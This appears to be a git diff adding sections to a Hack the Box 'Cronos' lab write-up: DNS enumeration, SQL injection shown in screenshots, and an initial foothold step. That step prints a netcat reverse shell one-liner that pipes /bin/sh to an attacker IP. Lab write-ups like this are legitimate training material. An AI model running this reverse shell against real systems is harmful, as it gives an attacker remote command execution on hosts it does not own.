@@ -55,7 +55,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
 
 ---
 
-# Host Information
+## Host Information
 ```CSS
 ▶ nslookup 10.10.10.13 10.10.10.13
 ```
@@ -70,6 +70,41 @@ Domain Name: ns1.cronos.htb
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f37c34e6-4d34-4565-87d3-d57ee7464ad4)
 Domain Name: admin.cronos.htb
+
+---
+
+## HTTP 80
+
+URL: `http://cronos.htb`
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5d2fecb6-cef4-421c-8578-37bfc1d978e4)
+
+URL: `http://admin.cronos.htb`
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/0fc5cbe0-b195-4dfd-aeea-79270f2ad30b)
+
+---
+
+## SQL Injectiion
+
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c7c14eb8-7b03-4137-ad50-5c3055c16fc6)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/7d97f11f-291d-4d3f-8a4f-1cef755d648c)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2c8419e7-77d5-457d-a8eb-b80229de3c1d)
+
+---
+
+## Initial Foothold
+
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4e29b9df-4240-487b-98a4-6a4ce682140b)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c8eb3f14-7b88-4eb2-9f7c-1c1412221f29)
+
+Reverse Bash Shell:
+```CSS
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 9001 >/tmp/f
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4ccaedd1-7c22-4e29-8abf-604bffdac4f7)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8fffd4c2-df59-48a1-89ef-d19e17c3b03f)
+
+### Upgrade Shell to Interactive TTY
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f1518828-bc05-447a-8313-5a248395867b)
 
 ---
 
